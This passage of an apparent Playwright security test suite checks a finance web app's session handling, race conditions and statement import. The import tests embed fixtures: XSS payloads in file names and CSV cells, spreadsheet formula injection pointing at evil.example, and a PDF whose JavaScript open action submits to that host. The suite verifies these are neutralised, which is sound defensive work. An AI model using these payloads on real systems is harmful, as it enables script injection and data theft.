    page.evaluate(f"location.hash = '#/movimientos?acc={seed['a1']}'")
    page.wait_for_selector('#movList [data-act="editMov"]', timeout=10000)
    subs = page.eval_on_selector_all("#movList .row .sub", "els => [...new Set(els.map((e) => e.textContent))]")
    check("Movimientos: under each title only how it was paid (no category, no time)", subs == [seed["a1name"]], str(subs[:3]))
    # F34 + Seguridad: an edit that moves a row out of the filter, then "Cargar más": no row is skipped
    page.click('#movList [data-act="editMov"]')
    page.wait_for_selector('form[data-submit="saveMov"] select[name="account"]')
    page.select_option('form[data-submit="saveMov"] select[name="account"]', str(seed["a2"]))
    page.click('form[data-submit="saveMov"] button.primary')
    poll(page, "!document.getElementById('sheet').open", 8)
    for _ in range(6):  # every page, one tap at a time
        if not page.query_selector('[data-act="moreMov"]'):
            break
        n = len(page.query_selector_all('#movList [data-act="editMov"]'))
        page.click('[data-act="moreMov"]')
        poll(page, f"document.querySelectorAll('#movList [data-act=editMov]').length > {n} || !document.querySelector('[data-act=moreMov]')", 8)
    shown = page.eval_on_selector_all('#movList [data-act="editMov"]', "els => els.map((e) => e.dataset.id)")
    server = req("GET", f"/api/movements?account_id={seed['a1']}&month={seed['today'][:7]}&limit=300",
                 cookie=next((f"{c['name']}={c['value']}" for c in ctx.cookies() if c["name"] == "fz_s"), "")).json() or {}
    want = [str(m["id"]) for m in server.get("items", [])]
    check("an edited row that leaves the filter does not make 'Cargar más' skip one",
          len(shown) == len(set(shown)) and sorted(shown) == sorted(want), f"shown {len(shown)}, server {len(want)}")
    # wake() on a screen she did not touch (Movimientos with its filters as drawn): it draws again with fresh data
    page.evaluate("location.hash = '#/movimientos'")
    page.wait_for_selector('#movList [data-act="editMov"]', timeout=10000)
    page.wait_for_timeout(400)
    page.evaluate("document.getElementById('app').firstElementChild.dataset.w4 = '1'; import('/js/state.js').then((m) => { "
                  "m.S.boot.today = '2000-01-01'; document.dispatchEvent(new Event('visibilitychange')); })")
    redrawn = poll(page, "!document.querySelector('#app [data-w4]')", 6)
    check("wake: an untouched screen (Movimientos, filters as drawn) draws again when the start data is old", redrawn)
    # wake(): a form she filled and left is not drawn over when the start data turns old
    page.evaluate("location.hash = '#/agregar'")
    page.wait_for_selector("#comercio")
    page.fill("#comercio", "a medio escribir")
    page.evaluate("document.activeElement.blur(); import('/js/state.js').then((m) => { m.S.boot.today = '2000-01-01'; "
                  "document.dispatchEvent(new Event('visibilitychange')); })")
    page.wait_for_timeout(2500)
    kept = page.input_value("#comercio") if page.query_selector("#comercio") else None
    fresh = page.evaluate("import('/js/state.js').then((m) => !!m.S.boot && m.S.boot.today !== '2000-01-01')")
    check("wake: a filled-in Agregar stays as she left it, the start data still reloads behind it",
          kept == "a medio escribir" and fresh, f"field={kept!r} reloaded={fresh}")
    # F15 + F27: a new day with no signal never drops the start data mid-load, and the retry screen shows
    page.route("**/api/bootstrap", lambda r: r.abort())
    page.evaluate("import('/js/state.js').then((m) => { m.S.boot.today = '2000-01-01'; location.hash = '#/'; })")
    page.wait_for_timeout(150)
    kept_boot = page.evaluate("import('/js/state.js').then((m) => !!m.S.boot)")
    try:
        page.wait_for_selector('[data-act="retryBoot"]', timeout=8000)
        retry = True
    except Exception:
        retry = False
    page.unroute("**/api/bootstrap")
    page.click('[data-act="retryBoot"]') if retry else None
    back = page.wait_for_selector("#heroNum", timeout=8000) is not None if retry else False
    check("a new day without signal: start data kept while loading, then Reintentar, then the screen",
          kept_boot and retry and back, f"kept={kept_boot} retry={retry} back={back}")
    check("Wave 4 part: no page errors", not errors, "; ".join(errors[:3]))
    ctx.close()


def late_answer_part(browser):
    """alice's session ends while an answer for her is still on its way, and bob signs in before the reload."""
    print("== late answers around a session switch")
    ctx, page, errors = timing_context(browser, "198.51.100.21")
    page.goto(BASE + "/", wait_until="networkidle")
    sign_in(page, "alice")
    page.wait_for_selector("#heroNum")
    page.wait_for_timeout(700)
    alice_hero = page.text_content("#heroNum")
    page.wait_for_timeout(5200)  # past the memory's 5 s fresh window, so a touch on a tab loads again
    y, m = int(TODAY[:4]), int(TODAY[5:7])
    prev = f"{y - 1}-12" if m == 1 else f"{y}-{m - 1:02d}"
    # Home of the month before (never seen): its summary is answered while alice is still signed in, and held.
    late = Hold(page, lambda url: f"/api/summary?month={prev}" in url, answered=True)
    page.click('[data-act="month"][data-n="-1"]')
    held = late.wait()
    session = next((f"{c['name']}={c['value']}" for c in ctx.cookies() if c["name"] == "fz_s"), "")
    ended = req("POST", "/api/logout", {}, session).status if session else 0
    page.evaluate(STAY + "window.__stay = 1; window.__samePage = 1")  # the reload after the 401 does not come yet
    page.dispatch_event('#tabs a[href="#/analisis"]', "pointerdown")  # a touch on a tab: its load gets the 401
    page.wait_for_selector('form[data-submit="login"]', timeout=8000)
    page.wait_for_timeout(300)
    page.evaluate("window.__mark = 0; window.__heroLog = []; window.__watch = 1")
    late.release()  # alice's late answer arrives after her session ended
    page.wait_for_timeout(800)
    form = page.query_selector('form[data-submit="login"]') is not None
    marks, asked = page.evaluate("[window.__mark, window.__unloads || 0]")
    check("a late answer for alice after her session ended draws nothing (the login form stays)",
          held and ended == 200 and asked >= 1 and form and marks == 0,
          f"held={held} ended={ended} reload asked={asked} form stays={form} frames with alice's mark={marks}")
    if form:
        sign_in(page, "bob")  # on the same page, before its reload has come
        page.wait_for_timeout(1500)
        log, marks2, in_page, asked2 = page.evaluate(
            "[window.__heroLog, window.__mark, window.__samePage === 1 && !!document.getElementById('heroNum'), window.__unloads || 0]")
        page.evaluate("window.__stay = 0")
        page.reload(wait_until="networkidle")  # the reload comes
        page.wait_for_selector("#tabs:not([hidden])", timeout=15000)
        page.wait_for_selector("#heroNum")
        page.wait_for_timeout(700)
        bob_text = page.inner_text("body")
        check("bob signing in on that page before its reload: the page reloads for him, nothing of his drawn on "
              "alice's page, none of her frames",
              asked2 > asked and not in_page and alice_hero not in log and marks2 == 0 and MARK not in bob_text,
              f"reload asked={asked2 > asked} drawn on alice's page={in_page} alice's number in bob's frames={alice_hero in log}")
    else:
        check("bob signing in on that page before its reload: the page reloads for him, nothing of his drawn on "
              "alice's page, none of her frames", False, "no login form to sign in on")
    check("late answers: no page errors", not errors, "; ".join(errors[:3]))
    ctx.close()


def save_race_part(browser):
    """A purchase saved while Home loads, both ways round: Home must end with the numbers after the save."""
    print("== a save racing a screen load")
    ctx, page, errors = timing_context(browser, "198.51.100.22")
    page.goto(BASE + "/", wait_until="networkidle")
    sign_in(page, "alice")
    page.wait_for_selector("#heroNum")
    session = next((f"{c['name']}={c['value']}" for c in ctx.cookies() if c["name"] == "fz_s"), "")
    month = TODAY[:7]

    def home_matches_server():
        page.wait_for_timeout(1500)
        el = page.query_selector(".totalrow strong")
        shown = el.text_content() if el else None
        want = money_text(req("GET", f"/api/summary?month={month}", cookie=session).json()["spent_cents"])
        return shown == want, f"Home shows {shown!r}, the server {want!r}"

    # 1. The save is still on its way (held before it reaches the server) when Home is tapped.
    page.click('#tabs a[href="#/agregar"]')
    page.wait_for_selector("#amt")
    page.fill("#amt", "12.34")
    post = Hold(page, lambda url: url.endswith("/api/movements"), answered=False, method="POST")
    page.click("#saveBtn")
    held1 = post.wait()
    page.click('#tabs a[href="#/"]')
    page.wait_for_timeout(1200)  # Home loads and draws while the save waits
    post.release()
    ok1, why1 = home_matches_server()
    check("a save still on its way when Home is tapped: Home ends with the new numbers", held1 and ok1, f"held={held1} {why1}")

    # 2. Home's numbers are on their way (answered before the save, held) when Save is tapped on the screen
    #    that still shows. A fresh page, so Home is not in memory and the form stays while Home loads.
    page.evaluate("location.hash = '#/agregar'")
    page.reload(wait_until="networkidle")
    page.wait_for_selector("#amt")
    page.fill("#amt", "23.45")
    late = Hold(page, lambda url: f"/api/summary?month={month}" in url, answered=True)
    page.click('#tabs a[href="#/"]')
    held2 = late.wait()
    page.click("#saveBtn")
    page.wait_for_timeout(1200)  # the save goes through
    late.release()
    ok2, why2 = home_matches_server()
    check("Home's numbers on their way when a purchase is saved: Home ends with the new numbers", held2 and ok2,
          f"held={held2} {why2}")
    check("save race: no page errors", not errors, "; ".join(errors[:3]))
    ctx.close()


def other_tab_part(browser):
    """Two tabs of the app in one browser share the cookie but not their memory. alice signs out in one and bob
    signs in there: the other tab must show nothing of alice's afterwards, not even from its screen memory."""
    print("== two tabs in one browser")
    ctx = browser.new_context(viewport={"width": 390, "height": 844}, extra_http_headers={"CF-Connecting-IP": "198.51.100.23"})
    ctx.add_init_script(INIT)
    one, two = ctx.new_page(), ctx.new_page()
    errors = []
    for p in (one, two):
        p.on("pageerror", lambda e: errors.append(str(e)[:120]))
    one.goto(BASE + "/", wait_until="networkidle")
    sign_in(one, "alice")
    one.wait_for_selector("#heroNum")
    for tab, sel in [("#/movimientos", "#movList .row"), ("#/analisis", "#anHero"), ("#/", "#heroNum")]:
        one.click(f'#tabs a[href="{tab}"]')
        one.wait_for_selector(sel)
        one.wait_for_timeout(500)
    two.goto(BASE + "/#/ajustes", wait_until="networkidle")
    two.wait_for_selector('[data-act="logout"]')
    with two.expect_navigation(wait_until="load", timeout=10000):
        two.click('[data-act="logout"]')
    two.wait_for_selector('form[data-submit="login"]', timeout=10000)
    sign_in(two, "bob")
    two.wait_for_selector("#tabs:not([hidden])", timeout=15000)
    one.wait_for_timeout(1500)
    one.evaluate("window.__mark = 0; window.__watch = 1")
    tabs = one.query_selector("#tabs:not([hidden])") is not None
    if tabs:  # whoever sits at the first tab opens Movimientos there
        one.click('#tabs a[href="#/movimientos"]')
        one.wait_for_timeout(1200)
    marks = one.evaluate("window.__mark")
    text = one.inner_text("body")
    check("signing out and in on one tab leaves nothing of alice's on another tab (its memory included)",
          marks == 0 and MARK not in text, f"tab bar shown={tabs} frames with alice's mark={marks} mark in text={MARK in text}")
    check("two tabs: no page errors", not errors, "; ".join(errors[:3]))
    ctx.close()

# ---------------------------------------------------------------- import part (statements read on the phone)

PDF_PAD = bytes.fromhex("28BF4E5E4E758A4164004E56FFFA01082E2E00B6D0683E802F0CA9FE6453697A")
PDF_PASS = "fz-attack-open-7Q"  # made-up passwords for the made-up locked PDF; they must never leave the page
PDF_WRONG = "fz-attack-wrong-3K"


def rc4(key, data):
    s = list(range(256))
    j = 0
    for i in range(256):
        j = (j + s[i] + key[i % len(key)]) & 255
        s[i], s[j] = s[j], s[i]
    out = bytearray()
    i = j = 0
    for b in data:
        i = (i + 1) & 255
        j = (j + s[i]) & 255
        s[i], s[j] = s[j], s[i]
        out.append(b ^ s[(s[i] + s[j]) & 255])
    return bytes(out)


def make_pdf(lines, password=None):
    """A made-up one-page PDF: (x, y, text) at fixed places in Helvetica (not embedded). Without a password it also
    has a JavaScript open action and a javascript: link over the page, which must never run. With one, the
    standard 40-bit RC4 lock (revision 2), so the page has to ask for the password."""
    esc_ = lambda t: t.replace("\\", "\\\\").replace("(", "\\(").replace(")", "\\)")  # noqa: E731
    content = ("BT /F1 9 Tf\n" + "".join(f"1 0 0 1 {x} {y} Tm ({esc_(t)}) Tj\n" for x, y, t in lines) + "ET\n").encode("latin-1")
    file_id = hashlib.md5(b"fz-attack" + content + (password or "").encode()).digest()
    objs = {
        1: b"<< /Type /Catalog /Pages 2 0 R" + (b"" if password else b" /OpenAction 5 0 R") + b" >>",
        2: b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>",
        3: b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Resources << /Font << /F1 4 0 R >> >> /Contents 6 0 R"
           + (b"" if password else b" /Annots [7 0 R]") + b" >>",
        4: b"<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica /Encoding /WinAnsiEncoding >>",
    }
    extra = b""
    if password:
        pw = (password.encode() + PDF_PAD)[:32]
        o = rc4(hashlib.md5((b"fz-attack-owner" + PDF_PAD)[:32]).digest()[:5], pw)
        key = hashlib.md5(pw + o + struct.pack("<i", -4) + file_id).digest()[:5]
        u = rc4(key, PDF_PAD)
        content = rc4(hashlib.md5(key + (6).to_bytes(3, "little") + (0).to_bytes(2, "little")).digest()[:10], content)
        objs[8] = f"<< /Filter /Standard /V 1 /R 2 /O <{o.hex()}> /U <{u.hex()}> /P -4 >>".encode()
        extra = b" /Encrypt 8 0 R"
    else:
        objs[5] = b"<< /S /JavaScript /JS (window.__xss=51; app.alert\\(1\\); this.submitForm\\('http://evil.example/'\\)) >>"
        objs[7] = b"<< /Type /Annot /Subtype /Link /Rect [0 0 612 792] /A << /S /URI /URI (javascript:window.__xss=52) >> >>"
    objs[6] = b"<< /Length %d >>\nstream\n" % len(content) + content + b"\nendstream"
    out = bytearray(b"%PDF-1.4\n%FZRAWPDF only in the file\n")
    offsets = {}
    for n in sorted(objs):
        offsets[n] = len(out)
        out += b"%d 0 obj\n" % n + objs[n] + b"\nendobj\n"
    size = max(objs) + 1
    xref = len(out)
    out += b"xref\n0 %d\n0000000000 65535 f \n" % size
    for n in range(1, size):
        out += b"%010d 00000 n \n" % offsets[n] if n in offsets else b"0000000000 65535 f \n"
    out += b"trailer\n<< /Size %d /Root 1 0 R /ID [<%s> <%s>]%s >>\nstartxref\n%d\n%%%%EOF\n" % (
        size, file_id.hex().encode(), file_id.hex().encode(), extra, xref)
    return bytes(out)


def prev_month():
    y, m = int(TODAY[:4]), int(TODAY[5:7])
    y, m = (y - 1, 12) if m == 1 else (y, m - 1)
    return y, m, calendar.monthrange(y, m)[1]


def ugly_statement():
    """A made-up statement in the UglyCash layout (the simplest reader), payload shop names, a weekly charge
    (so "Pagos fijos" lists a payload name), money in of every kind, and a card number to mask."""
    y, m, last = prev_month()
    weekly = f'<svg onload="window.__xss=53">{MARK}-weekly'
    rows = [(3, "Card " + weekly, "-", 999), (10, "Card " + weekly, "-", 999), (17, "Card " + weekly, "-", 999),
            (24, "Card " + weekly, "-", 999), (5, XSS[0], "-", 1200), (6, XSS[1], "-", 1300), (7, XSS[3], "-", 1400),
            (8, f"PAGO 4000 1234 5678 9010 {MARK}", "-", 1500), (12, f"Virtual Deposit {MARK}", "+", 50000),
            (14, f"REFUND from <b>x</b>{MARK}", "+", 300), (15, f"Payvalida Deposit {MARK}", "+", 5000)]
    plus = sum(c for _, _, sg, c in rows if sg == "+")
    minus = sum(c for _, _, sg, c in rows if sg == "-")
    usd = lambda c: f"${c // 100:,}.{c % 100:02d}"  # noqa: E731
    lines = [(40, 750, "UglyCash"), (300, 750, "Monthly statement"),
             (40, 720, f"Balance on {m}/1"), (300, 720, usd(10000)), (40, 706, "Credits"), (300, 706, "+" + usd(plus)),
             (40, 692, "Debits"), (300, 692, "-" + usd(minus)), (40, 678, "Rewards earned"), (300, 678, "+$0.00"),
             (40, 664, f"Balance on {m}/{last}"), (300, 664, usd(10000 + plus - minus))]
    for k, (d, desc, sg, c) in enumerate(sorted(rows)):
        yy = 630 - 14 * k
        lines += [(40, yy, f"{m:02d}/{d:02d}/{y}"), (120, yy, desc), (480, yy, sg + usd(c))]
    # rows, spending, income: wallet money in the reader cannot name (the "REFUND") is income waiting in Revisar (F09)
    return lines, len(rows), minus, 50300


def bank_csv():
    """A made-up bank CSV with no type column: payload names, formulas, a card number, money in (pay) and a
    column the app never maps, whose values must never leave the page."""
    y, m, _ = prev_month()
    d = lambda n: f"{n:02d}/{m:02d}/{y}"  # noqa: E731
    out = io.StringIO()
    w = csv.writer(out)
    w.writerow(["Fecha", "Descripcion", "Monto", f'<img src=x onerror="window.__xss=43">CSVONLY{MARK}'])
    w.writerow([d(3), f"<script>window.__xss=44</script>{MARK}", "-12.34", "CSVONLY-1"])
    w.writerow([d(5), f'=HYPERLINK("http://evil.example","x"){MARK}', "-5.00", "CSVONLY-2"])
    w.writerow([d(6), f"@SUM(A1) {MARK}", "-6.00", "CSVONLY-3"])
    w.writerow([d(7), f"TARJETA 4000-1234-5678-9010 {MARK}", "-7.00", "CSVONLY-4"])
    w.writerow([d(15), f"PLANILLA DEMO {MARK}", "1500.00", "CSVONLY-5"])
    return out.getvalue().encode(), 5, 3034, 150000


def poll(page, js, timeout=30):
    end = time.time() + timeout
    while time.time() < end:
        try:
            if page.evaluate(js):
                return True
        except Exception:  # a redraw while we look is fine
            pass
        page.wait_for_timeout(150)
    return False


def import_part(a_cookie, b_cookie, acc_id):
    """alice imports a made-up CSV, a made-up PDF and the same PDF locked with a password through the import
    screen, then bob tries her imports and column maps. Payloads come in through the files themselves."""
    from playwright.sync_api import sync_playwright

    print("== import (statements read on the phone)")
    a_boot = boot(a_cookie).json()
    cash = next(a["id"] for a in a_boot["accounts"] if a["id"] != acc_id)
    y, m, _ = prev_month()
    month = f"{y}-{m:02d}"
    csv_bytes, csv_n, csv_out, csv_in = bank_csv()
    lines, pdf_n, pdf_out, pdf_in = ugly_statement()
    before = req("GET", "/api/export.csv", cookie=a_cookie).body
    files = [
        {"name": f'<img src=x onerror="window.__xss=45">{MARK}.csv', "mimeType": "text/csv", "buffer": csv_bytes},
        {"name": f"estado <svg onload=window.__xss=46>{MARK}.pdf", "mimeType": "application/pdf", "buffer": make_pdf(lines)},
        {"name": "bloqueado 1234567890123456.pdf", "mimeType": "application/pdf", "buffer": make_pdf(lines, PDF_PASS)},
        {"name": "grande.csv", "mimeType": "text/csv", "buffer": b"Fecha,Descripcion,Monto\n" + b"x" * (5 * 1024 * 1024)},
        {"name": "grande.pdf", "mimeType": "application/pdf", "buffer": b"%PDF-1.4\n" + b"0" * (10 * 1024 * 1024)},
    ]
    sent = []  # every request the page makes: what left the phone
    with sync_playwright() as p:
        browser = p.chromium.launch(channel="chrome", headless=True)
        ctx = browser.new_context(viewport={"width": 390, "height": 844})
        ctx.add_cookies([{"name": "fz_s", "value": a_cookie.split("=", 1)[1], "url": BASE, "httpOnly": True, "sameSite": "Strict"}])
        ctx.add_init_script(INIT)
        page = ctx.new_page()
        dialogs, errors = [], []
        page.on("dialog", lambda d: (dialogs.append(d.type), d.dismiss()))
        page.on("pageerror", lambda e: errors.append(str(e)[:120]))
        page.on("request", lambda r: sent.append(r.url + " " + (r.post_data or "")))
        page.goto(BASE + "/#/importar", wait_until="networkidle")
        page.wait_for_selector("#impFile", timeout=15000)
        page.set_input_files("#impFile", files)
        sec = "document.querySelectorAll('.imp-file')"
        read = poll(page, f"""(() => {{ const s = {sec}; return s.length === 5 && !!s[0].querySelector('select[data-imp-acc]')
            && !!s[1].querySelector('select[data-imp-acc]') && !!s[2].querySelector('form[data-submit="impPass"]')
            && !!s[3].querySelector('.imp-bad') && !!s[4].querySelector('.imp-bad'); }})()""")
        big = page.evaluate(f"[...{sec}].slice(3).map((x) => !!x.querySelector('select, form, .imp-rows'))") if read else []
        check("import screen: a made-up CSV and PDF are read on the phone, the locked PDF asks for its password, "
              "files over 5 MB (CSV) and 10 MB (PDF) are refused before reading", read and big == [False, False],
              f"read={read} oversized went further={big}")
        pass_form = 'form[data-submit="impPass"][data-i="2"]'
        asked = page.text_content(pass_form + " label span") if read else ""
        page.fill(pass_form + ' input[name="p"]', PDF_WRONG)
        page.click(pass_form + " button")
        again = poll(page, f"""(() => {{ const f = document.querySelector('{pass_form}');
            return !!f && f.querySelector('label span').textContent !== {json.dumps(asked)}; }})()""")
        page.fill(pass_form + ' input[name="p"]', PDF_PASS)
        page.click(pass_form + " button")
        opened = poll(page, "!!document.querySelector('select[data-imp-acc][data-i=\"2\"]')")
        check("locked PDF: a wrong password asks again, the right one opens it", again and opened, f"again={again} opened={opened}")
        for i, acc in [(0, cash), (1, acc_id), (2, acc_id)]:
            page.select_option(f'select[data-imp-acc][data-i="{i}"]', str(acc))
            poll(page, f"!!{sec}[{i}].querySelector('.imp-counts')")
        ready = poll(page, "(() => { const b = document.querySelector('[data-act=\"impSave\"]'); return !!b && !b.disabled; })()")
        page.click('[data-act="impSave"]')
        saved = ready and poll(page, "!document.querySelector('select[data-imp-acc]') && !!document.querySelector('.imp-rec')"
                                     " && !!document.querySelector('section.rv')", timeout=45)
        page.wait_for_timeout(500)
        text = page.inner_text("#app")
        items = {i["id"]: i for i in req("GET", "/api/imports", cookie=a_cookie).json()["items"]}
        by = sorted(items.values(), key=lambda i: i["id"])
        counts = [(i["source"], i["added"], i["already"]) for i in by]
        check("three statements saved; the locked copy of the same PDF added nothing (all already there)",
              saved and counts == [("csv", csv_n, 0), ("uglycash", pdf_n, 0), ("uglycash", 0, pdf_n)], f"saved={saved} {counts}")
        injected = page.eval_on_selector_all(INJECTED, "els => els.length")
        check("import screen: file names, CSV headers, rows, Pagos fijos and Revisá 10 show payloads as plain text only",
              not injected and MARK in text and "<script>" in text and "-weekly" in text and "onerror" in text,
              f"injected={injected} mark={MARK in text}")
        check("import screen: digit runs in file names and shop names keep only their last 4",
              "1234567890123456" not in text and "5678 9010" not in text and "••••3456" in text)
        # The buttons on the found fixed payments and the review chips work on alice's own rows.
        keep = page.query_selector('[data-act="impKeep"][data-v="0"]')
        if keep:
            keep.click()
            page.wait_for_timeout(500)
        chip = page.query_selector('[data-act="impCat"]')
        if chip:
            chip.click()
            page.wait_for_timeout(700)
        for hash_ in ["#/pasos/ahorro", "#/pasos/limites", "#/importar"]:
            page.evaluate(f"location.hash = {json.dumps(hash_)}")
            page.wait_for_load_state("networkidle")
            page.wait_for_timeout(400)
            injected += page.eval_on_selector_all(INJECTED, "els => els.length")
            text += page.inner_text("#app")
        hist = page.query_selector_all(".imp-hist .row")
        check("savings, limits and the import history (payload account name) show no HTML",
              not injected and len(hist) == 3 and "onerror=alert(1)" in text, f"injected={injected} history rows={len(hist)}")

        # What the server kept: only rows, typed and masked as the rules say.
        rows = req("GET", f"/api/movements?month={month}&limit=300", cookie=a_cookie).json()["items"]
        by_amt = {r["amount_cents"]: r for r in rows}
        pay, dep, ref = by_amt.get(150000, {}), by_amt.get(50000, {}), by_amt.get(300, {})
        check("CSV money in with no type is income waiting in Revisar (never a refund); the wallet's deposit is income, "
              "and its unnamed money in waits in Revisar as income (only a card's credits are refunds)",
              (pay.get("tipo"), pay.get("estado"), dep.get("tipo"), ref.get("tipo"), ref.get("estado"))
              == ("ingreso", "revisar", "ingreso", "ingreso", "revisar"),
              f"{pay.get('tipo')} {pay.get('estado')} {dep.get('tipo')} {ref.get('tipo')} {ref.get('estado')}")
        sm = req("GET", f"/api/summary?month={month}", cookie=a_cookie).json()
        check("the month's spending and income add up from the imported rows (money in never lowers spending)",
              (sm["spent_cents"], sm["income_cents"]) == (csv_out + pdf_out, csv_in + pdf_in),
              f"spent {sm['spent_cents']} vs {csv_out + pdf_out}, income {sm['income_cents']} vs {csv_in + pdf_in}")
        exp = req("GET", "/api/export.csv", cookie=a_cookie).body.decode("utf-8-sig")
        cells = [c for row in csv.reader(io.StringIO(exp)) for c in row]
        check("imported rows: no card number in full, no export cell that a spreadsheet would run",
              not re.search(r"\d{4}[ -]?\d{4}[ -]?\d{4}[ -]?\d{4}", exp) and not [c for c in cells if c[:1] in ("=", "+", "-", "@", "\t", "\r")]
              and "HYPERLINK" in exp)
        leaked = [x for x in ["CSVONLY", "FZRAWPDF", PDF_PASS, PDF_WRONG] if any(x in r for r in sent)]
        leaked += sorted({r.split(" ", 1)[0] for r in sent if not r.startswith(BASE + "/")})  # the PDF's script and link
        check(f"nothing but rows left the phone in {len(sent)} requests: no unmapped CSV column, no file bytes, "
              "no password, no request anywhere else (the PDF's script and link)", not leaked, ", ".join(leaked))
        stored = page.evaluate("""async () => {
          const out = [JSON.stringify({ ...localStorage }), JSON.stringify({ ...sessionStorage })];
          out.push(JSON.stringify((await indexedDB.databases()).map((d) => d.name)));
          for (const k of await caches.keys()) { const c = await caches.open(k);
            for (const r of await c.keys()) out.push(new URL(r.url).pathname); }
          out.push([...document.querySelectorAll('input')].map((i) => i.value).join(' '));
          out.push(document.documentElement.outerHTML.includes(%s) ? 'password in page' : '');
          return out.join('\\n'); }""" % json.dumps(PDF_PASS))
        bad = [x for x in [PDF_PASS, PDF_WRONG, "password in page", "CSVONLY", "/import/", "/vendor/", "/api/"] if x in stored]
        check("nothing of the files or the password is kept on the phone (storage, IndexedDB, caches, the page)", not bad, ", ".join(bad))
        # Undo the CSV import from the history list: its rows go, the PDF's stay.
        csv_id = next(i["id"] for i in by if i["source"] == "csv")
        page.click(f'[data-act="impUndo"][data-id="{csv_id}"]')
        page.wait_for_timeout(200)
        page.click(f'[data-act="impUndo"][data-id="{csv_id}"]')
        undone = poll(page, f"""(() => {{ const r = [...document.querySelectorAll('.imp-hist .row')]; return r.length === 3
            && !document.querySelector('[data-act="impUndo"][data-id="{csv_id}"]'); }})()""")
        after = req("GET", "/api/export.csv", cookie=a_cookie).body.decode("utf-8-sig")
        check("undo from the history removes the CSV's rows and keeps the PDF's",
              undone and "PLANILLA DEMO" not in after and "-weekly" in after and len(after.splitlines()) == len(before.decode("utf-8-sig").splitlines()) + pdf_n,
              f"undone={undone}")
        state = page.evaluate("({xss: window.__xss ?? null, csp: window.__csp})")
        check("import: no payload ran (file names, CSV, PDF script and link) and no dialog", state["xss"] is None and not dialogs,
              f"xss={state['xss']} dialogs={dialogs}")
        check("import: no script or inline handler was even tried (no CSP reports)", not state["csp"], str(state["csp"][:5]))
        check("import: no page errors", not errors, "; ".join(errors[:3]))
        sig = next((re.search(r"/api/imports/csv-maps/([0-9a-f]{32})", r).group(1) for r in sent if "/api/imports/csv-maps/" in r), "")
        rec_key = next((r["merchant_key"] for r in req("GET", "/api/imports/recurring", cookie=a_cookie).json()["items"]), "")
        ctx.close()
        browser.close()

    # Server limits on imports (alice).
    y2, m2, last2 = prev_month()
    period = {"period_start": f"{y2}-{m2:02d}-01", "period_end": f"{y2}-{m2:02d}-{last2}"}
    row = lambda k: {"fecha": period["period_start"], "comercio": f"LIMITE {k}", "cents": 100 + k, "dir": "out"}  # noqa: E731
    new = req("POST", "/api/imports", {"account_id": acc_id, "source": "csv", "balanced": False, **period}, a_cookie)
    nid = new.json()["id"] if new.status == 201 else 0
    lim = [
        req("POST", "/api/imports/preview", {"account_id": acc_id, "source": "csv", **period, "rows": [row(k) for k in range(501)]}, a_cookie).status,
        req("POST", f"/api/imports/{nid}/rows", {"part": 0, "rows": [row(k) for k in range(501)]}, a_cookie).status,
        req("POST", f"/api/imports/{nid}/rows", None, a_cookie, raw=json.dumps({"part": 0, "rows": [{**row(k), "comercio": "x" * 120} for k in range(450)]}).encode()).status,
        req("POST", f"/api/imports/{nid}/rows", {"part": 0, "rows": [{**row(0), "fecha": "2001-01-01"}]}, a_cookie).status,
        req("POST", "/api/imports", {"account_id": acc_id, "source": "csv", "balanced": False, "period_start": "2024-01-01", "period_end": period["period_end"]}, a_cookie).status,
        req("POST", "/api/imports", {"account_id": acc_id, "source": "evil", "balanced": False, **period}, a_cookie).status,
        req("POST", f"/api/imports/{nid}/rows", {"part": 0, "rows": [{**row(0), "cents": 10**13}]}, a_cookie).status,
    ]
    check("import limits: over 500 rows, over 64 KB, a row outside the period, a period over 400 days, an unknown "
          "source and a huge amount are all refused", new.status == 201 and lim == [400, 400, 413, 400, 400, 400, 400], f"{new.status} {lim}")
    req("POST", f"/api/imports/{nid}/undo", {}, a_cookie)

    # Wave 2 review: one part is one transaction with its claim. The same part 6 times at once is saved once, the next
    # part out of order is refused, and nothing lands on an import after its undo.
    from concurrent.futures import ThreadPoolExecutor
    pid_ = req("POST", "/api/imports", {"account_id": acc_id, "source": "csv", "balanced": False, **period}, a_cookie).json()["id"]
    part0 = {"part": 0, "rows": [{**row(k), "comercio": f"PARTE {k}"} for k in range(3)]}
    with ThreadPoolExecutor(max_workers=6) as ex:
        burst = sorted(r.status for r in ex.map(lambda _: req("POST", f"/api/imports/{pid_}/rows", part0, a_cookie), range(6)))
    in_ledger = [r for r in req("GET", f"/api/movements?month={period['period_start'][:7]}&limit=300", cookie=a_cookie).json()["items"]
                 if str(r.get("comercio", "")).startswith("PARTE ")]
    skip = req("POST", f"/api/imports/{pid_}/rows", {"part": 2, "rows": [row(9)]}, a_cookie).status
    req("POST", f"/api/imports/{pid_}/undo", {}, a_cookie)
    late = req("POST", f"/api/imports/{pid_}/rows", {"part": 1, "rows": [row(8)]}, a_cookie).status
    check("import parts: the same part 6 times at once saves its 3 rows once; a skipped part and a part after undo are refused",
          all(s_ in (200, 409) for s_ in burst) and len(in_ledger) == 3 and skip == 409 and late == 409,
          f"burst={burst} rows={len(in_ledger)} skip={skip} late={late}")

    # bob and alice's imports, column map, accounts and fixed payments.
    mine = req("GET", "/api/imports", cookie=a_cookie).body
    before = req("GET", "/api/export.csv", cookie=a_cookie).body
    b_acc = boot(b_cookie).json()["accounts"][0]["id"]
    tries = []
    for iid in list(items)[:3] + [nid]:
        tries += [("GET", f"/api/imports/{iid}/review", None), ("POST", f"/api/imports/{iid}/rows", {"part": 1, "rows": [row(1)]}),
                  ("POST", f"/api/imports/{iid}/finish", {}), ("POST", f"/api/imports/{iid}/undo", {})]
    tries += [
        ("PUT", f"/api/imports/csv-maps/{sig}", {"account_id": acc_id, "map": {"fecha": 0, "comercio": 1, "monto": 2, "cargo": None,
                                                                               "abono": None, "saldo": None, "order": "dmy", "sign": "out_negative"}}),
        ("POST", "/api/imports", {"account_id": acc_id, "source": "csv", "balanced": True, **period}),
        ("POST", "/api/imports/preview", {"account_id": acc_id, "source": "csv", **period, "rows": [row(1)]}),
        ("POST", "/api/imports/recurring", {"merchant_key": rec_key or "x", "keep": True}),
    ]
    refused = [(mt, pt, req(mt, pt, bd, b_cookie).status) for mt, pt, bd in tries]
    check(f"bob is refused on all {len(tries)} tries at alice's imports, undo, rows, column map, account and fixed payments",
          sig and rec_key and all(st_ in (400, 403, 404) for _, _, st_ in refused),
          f"sig={bool(sig)} key={bool(rec_key)} " + ", ".join(f"{mt} {pt} {st_}" for mt, pt, st_ in refused if st_ not in (400, 403, 404)))
